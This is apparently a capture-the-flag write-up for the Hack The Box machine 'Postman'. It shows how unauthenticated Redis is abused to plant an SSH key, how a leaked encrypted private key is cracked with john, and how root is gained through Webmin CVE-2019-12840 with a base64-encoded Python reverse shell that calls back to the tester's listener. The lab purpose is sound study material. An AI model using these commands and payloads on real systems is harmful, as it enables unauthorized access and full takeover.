# Postman

## Machine Info

![Postman](./Postman.assets/Postman.png)

## Recon

- nmap
  - 80, http
  - 10000, https
  - 6379, redis

```console
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 3.18 (94%), Linux 5.0 (94%), Linux 3.16 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 5.1 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.31 seconds
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-14 23:23 CST
Nmap scan report for 10.10.10.160
Host is up (0.097s latency).
```

## Foothold

### Unauthenticated Redis

- `redis-cli -h 10.10.10.160 -p 6379` -> successfully login
- use redis to write public key into authorized_keys file in order to login using ssh

local host:

```console
$ (echo -e '\n\n'; cat ~/.ssh/id_rsa.pub; echo -e '\n\n') > mypub
$ cat mypub | redis-cli -h 10.10.10.160 -p 6379 -x set qwepub
OK
```

remote host:

```console
10.10.10.160:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
10.10.10.160:6379> CONFIG SET dir '/var/lib/redis/.ssh'
OK
10.10.10.160:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis/.ssh"
10.10.10.160:6379> CONFIG SET dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> exit
```

login using ssh as redis

```console
$ ssh redis@$IP
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
ED25519 key fingerprint is SHA256:eBdalosj8xYLuCyv0MFDgHIabjJ9l3TMv1GYjZdxY9Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
redis@Postman:~$ uname -a
Linux Postman 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
redis@Postman:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:b9:ec:4f brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.160/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:ec4f/64 scope link
       valid_lft forever preferred_lft forever
redis@Postman:~$
```

## Privilege Escalation

### Private key Leakage

- backup of id_rsa file

```console
redis@Postman:/opt$ cat id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

- use john to crack password of private key -> `computer2008`
  - ssh Matt, matt failed
  - webadmin Matt:computer2008 -> ok
  - su Matt -> ok

```console
$ ssh2john id_rsa > hash

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 10 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)
1g 0:00:00:00 DONE (2024-01-15 15:17) 7.142g/s 1763Kp/s 1763Kc/s 1763KC/s comunista..cody28
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- enum as Matt -> **Webmin** process is running under root

```console
Matt@Postman:/tmp$ ps aux | grep -i webmin
root        804  0.0  0.5  95292  5048 ?        Ss   05:35   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
root      19436  4.0  2.4  98176 22244 ?        S    07:37   0:00 /usr/share/webmin/authentic-theme/stats.cgi
Matt      19440  0.0  0.1  14428  1088 pts/0    S+   07:37   0:00 grep --color=auto -i webmin
```

### CVE-2019-12840: Command Injection

![image-20240115162121120](./Postman.assets/image-20240115162121120.png)

![image-20240115162124361](./Postman.assets/image-20240115162124361.png)

- recon service version: **Webmin 1.910** (Ubuntu Linux 18.04.3)

```console
$ searchsploit Webmin 1.910
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)          | linux/remote/46984.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                   | linux/webapps/47330.rb
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- [KrE80r/webmin_cve-2019-12840_poc: A standalone POC for CVE-2019-12840 (github.com)](https://github.com/KrE80r/webmin_cve-2019-12840_poc)

- POC:

```console
$ python CVE-2019-12840.py -u https://10.10.10.160 -U Matt -P computer2008 -c "id"

  _______      ________    ___   ___  __  ___        __ ___   ___  _  _    ___
 / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ |__ \ / _ \| || |  / _ \
| |     \ \  / /| |__ ______ ) | | | || | (_) |______| |  ) | (_) | || |_| | | |
| |      \ \/ / |  __|______/ /| | | || |\__, |______| | / / > _ <|__   _| | | |
| |____   \  /  | |____    / /_| |_| || |  / /       | |/ /_| (_) |  | | | |_| |
 \_____|   \/   |______|  |____|\___/ |_| /_/        |_|____|\___/   |_|  \___/

                           by KrE80r

             Webmin <= 1.910 RCE (Authorization Required)

usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -c "id"
usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -lhost <LOCAL_IP> -lport 443


[*] logging in ...

[+] got sid f2613ccb62c6fd36005ca85ac34c033d

[*] sending command id

[<pre>Reading package lists...
Building dependency tree...
Reading state information...
The following packages were automatically installed and are no longer required:
  liblua5.1-0 libreadline-dev libtinfo-dev libtool-bin pkg-config
  python3-netifaces
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  apt-utils libapt-pkg5.0
Suggested packages:
  apt-doc aptitude | synaptic | wajig
The following packages will be upgraded:
  apt apt-utils libapt-pkg5.0
3 upgraded, 0 newly installed, 0 to remove and 178 not upgraded.
Need to get 2214 kB of archives.
After this operation, 45.1 kB of additional disk space will be used.
Ign:1 http://us.archive.ubuntu.com/ubuntu bionic-updates/main amd64 libapt-pkg5.0 amd64 1.6.12ubuntu0.1
Ign:2 http://us.archive.ubuntu.com/ubuntu bionic-updates/main amd64 apt amd64 1.6.12ubuntu0.1
Ign:3 http://us.archive.ubuntu.com/ubuntu bionic-updates/main amd64 apt-utils amd64 1.6.12ubuntu0.1
Err:1 http://security.ubuntu.com/ubuntu bionic-updates/main amd64 libapt-pkg5.0 amd64 1.6.12ubuntu0.1
  Temporary failure resolving 'us.archive.ubuntu.com'
Err:2 http://security.ubuntu.com/ubuntu bionic-updates/main amd64 apt amd64 1.6.12ubuntu0.1
  Temporary failure resolving 'us.archive.ubuntu.com'
Err:3 http://security.ubuntu.com/ubuntu bionic-updates/main amd64 apt-utils amd64 1.6.12ubuntu0.1
  Temporary failure resolving 'us.archive.ubuntu.com'
uid=0(root) gid=0(root) groups=0(root)
</pre>, <pre data-xconsole=""></pre>]
[+] exploit finished successfully!!
```

- EXP:

```console
$ python CVE-2019-12840.py -u https://10.10.10.160 -U Matt -P computer2008 -lhost 10.10.14.54 -lport 1234

  _______      ________    ___   ___  __  ___        __ ___   ___  _  _    ___
 / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ |__ \ / _ \| || |  / _ \
| |     \ \  / /| |__ ______ ) | | | || | (_) |______| |  ) | (_) | || |_| | | |
| |      \ \/ / |  __|______/ /| | | || |\__, |______| | / / > _ <|__   _| | | |
| |____   \  /  | |____    / /_| |_| || |  / /       | |/ /_| (_) |  | | | |_| |
 \_____|   \/   |______|  |____|\___/ |_| /_/        |_|____|\___/   |_|  \___/

                           by KrE80r

             Webmin <= 1.910 RCE (Authorization Required)

usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -c "id"
usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -lhost <LOCAL_IP> -lport 443


[*] logging in ...

[+] got sid 24b28c538ca26bb4f30ec7424251ce0b

[*] sending command python -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjU0IiwxMjM0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ=='))"
```

```console
$ sudo rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.54] from (UNKNOWN) [10.10.10.160] 41838
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
Linux Postman 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:b9:ec:4f brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.160/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:ec4f/64 scope link
       valid_lft forever preferred_lft forever
```

## Exploit Chain

port scan -> 2 web + 1 redis -> 80 http recon: nothing -> redis unauthenticated login -> write local ssh pub key into /var/lib/redis/.ssh/authorized_keys -> login using ssh as redis -> enum backup ssh private key -> john to crack -> password of Matt in Webmin and su (not ssh) -> enum Webmin process of root priv -> Webmin CVE command injection -> root shell
